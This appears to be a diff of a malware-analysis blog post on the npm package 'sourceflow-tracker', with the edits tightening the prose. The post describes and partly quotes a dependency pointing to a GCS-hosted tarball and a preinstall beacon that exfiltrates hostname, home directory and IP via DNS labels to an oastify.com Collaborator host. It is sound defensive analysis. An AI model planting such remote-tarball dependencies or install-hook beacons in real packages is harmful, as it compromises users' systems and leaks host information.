@@ -8,9 +8,7 @@ ecosystem: npm
 
 <img src="/assets/images/sourceflow-tracker-walrus-bucket.jpg" alt="Meme: a walrus guarding a bucket — 'I has a bucket.' Here npm fetches the payload from the attacker's bucket for them.">
 
-Most malicious npm packages hide their payload in the tarball you install. `sourceflow-tracker` couldn't be bothered. Its `index.js` is a decoy one-liner, and the only load-bearing thing in the package is a dependency whose version string is a URL into a Google Cloud Storage bucket. npm sees a remote tarball, shrugs, downloads it, and runs the `preinstall` hook inside — so npm does the fetching, npm does the detonating, and the registry never gets a copy of the real payload to scan. What npm dutifully retrieves is a verbatim copy of the public `network-speed` module with a beacon stapled on, phoning the host's internal IP, hostname, and home directory to a Burp Collaborator subdomain. The bucket name `lscunpentest` and the Collaborator callback give it away as dependency-confusion research — same cluster as [shop-minis](/discoveries/2026/05/shop-minis-burp-canary/) — but the walrus has a point: the novel bit is that the payload lives in a bucket, and npm is the one sent to go fetch it.
-
-Traits below are from cleave `2.0.0-rc.4` (traits `a50f8f636`); both stages were unpacked and read statically, nothing was detonated.
+Most malicious npm packages hide the payload in the tarball you install; `sourceflow-tracker` couldn't be bothered. Its only load-bearing content is a dependency whose version string is a URL into a Google Cloud Storage bucket, so npm does the fetching and npm does the detonating, and the registry never holds a copy to scan. What it retrieves is a verbatim copy of the public `network-speed` module with a beacon stapled on, phoning the host's internal IP, hostname, and home directory to a Burp Collaborator subdomain — dependency-confusion research from the [shop-minis](/discoveries/2026/05/shop-minis-burp-canary/) cluster, only this time the walrus sends npm to fetch its bucket.
 
 ## Package metadata
 
@@ -25,7 +23,7 @@ Traits below are from cleave `2.0.0-rc.4` (traits `a50f8f636`); both stages were
 
 ## Stage 1 — sourceflow-tracker: the bucket dependency
 
-The published package is an empty suit: a one-line `index.js`, npm's stock placeholder test script, and metadata that `npm init` defaults could have written on their own. All the intent lives in one dependency entry, where the version — normally a semver range or a registry name — is instead a raw URL into a public GCS bucket. npm resolves remote-tarball URLs without complaint, so installing this package quietly hands Google's storage domain the job of shipping stage two: no registry lookup, no `postinstall` here, nothing for an npm-side scanner to ever sample. And `storage.googleapis.com` makes a perfect mule — a domain nearly every corporate proxy already waves through, hosting a tarball the operator can swap whenever they like without touching npm again. cleave doesn't find this cute either; it carries a rule named for exactly this, a GCS bucket masquerading as a dependency version.
+The published package is an empty suit: a one-line `index.js`, npm's stock test script, and one dependency entry whose version — normally a semver range — is a raw URL into a public GCS bucket. npm resolves remote-tarball URLs without complaint, so `storage.googleapis.com` ships stage two: a domain every corporate proxy already waves through, hosting a tarball the operator can swap without touching npm again. cleave carries a rule named for exactly this, a GCS bucket masquerading as a dependency version.
 
 <pre class="lang-js"><code><span class="tok-com">// sourceflow-tracker package.json — the entire malicious surface</span>
 <span class="tok-str">"dependencies"</span>: {
@@ -42,7 +40,7 @@ The published package is an empty suit: a one-line `index.js`, npm's stock place
 
 ## Stage 2 — pack_ux_foundry: the preinstall beacon
 
-The tarball npm dragged home is a faithful copy of the public `network-speed` module — real, working speed-test code, completely untouched. The malware is a separate `test.js`. The manifest fires it from a `preinstall` hook and routes its output to oblivion, so nobody hears it run. It grabs three things about the host: the internal IPv4 address, the hostname, and the home-directory path. Hostname and home directory get hex-encoded so they survive as a single DNS label; the IP goes out in the clear. Here's the cheeky part — the beacon writes no HTTP client of its own, it just calls the borrowed library's `checkDownloadSpeed` against the Collaborator URL, so the "speed test" is really the exfil and the bandwidth it prints is set dressing. Each value leaves as the leftmost label of `<value>.ux-foundry.<collab>.oastify.com`, which leaks at DNS resolution whether or not the GET ever lands.
+The tarball is a faithful copy of the public `network-speed` module with the malware bolted on as a separate `test.js`, fired from a `preinstall` hook with its output routed to oblivion. It grabs the host's internal IPv4 (in the clear), hostname, and home directory (both hex-encoded to survive as a DNS label), then exfils each one not through its own HTTP client but by pointing the borrowed library's `checkDownloadSpeed` at the Collaborator URL — the "speed test" is the exfil. Each value leaves as the leftmost label of `<value>.ux-foundry.<collab>.oastify.com`, which leaks at DNS resolution whether or not the GET ever lands.
 
 <pre class="lang-js"><code><span class="tok-com">// pack_ux_foundry test.js — runs from preinstall, beacons three facts</span>
 <span class="tok-kw">const</span> hn = <span class="tok-fn">stringToHex</span>(os.<span class="tok-fn">hostname</span>());   <span class="tok-com">// hostname, hex'd for a DNS label</span>
@@ -64,7 +62,7 @@ The tarball npm dragged home is a faithful copy of the public `network-speed` mo
 
 ## Same recipe as shop-minis
 
-Strip the costume and this is the [shop-minis](/discoveries/2026/05/shop-minis-burp-canary/) experiment again: a dependency-confusion probe that beacons host recon to a Burp Collaborator subdomain on `oastify.com` and then politely stops — no stealer, no second payload, no persistence. What changed is who carries the bag. shop-minis stuffed everything into one install hook; [clx-cookieparser](/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/) ran its own `npm install` at runtime; this one just names a bucket and lets npm's dependency resolver go fetch — payload off the registry entirely, npm still the one running it. The walrus, as ever, has a bucket; the only mercy is that this one holds a recon ping and not a stealer — and the same trick with worse cargo would look identical until somebody re-read the tarball.
+Strip the costume and this is the [shop-minis](/discoveries/2026/05/shop-minis-burp-canary/) probe again: dependency-confusion recon beaconed to a Burp Collaborator subdomain, then it politely stops with no stealer or persistence, the only change being that the bucket — not an install hook — carries the bag. The mercy is that this bucket holds a recon ping; the same trick with worse cargo would look identical until somebody re-read the tarball.
 
 ## Indicators
 
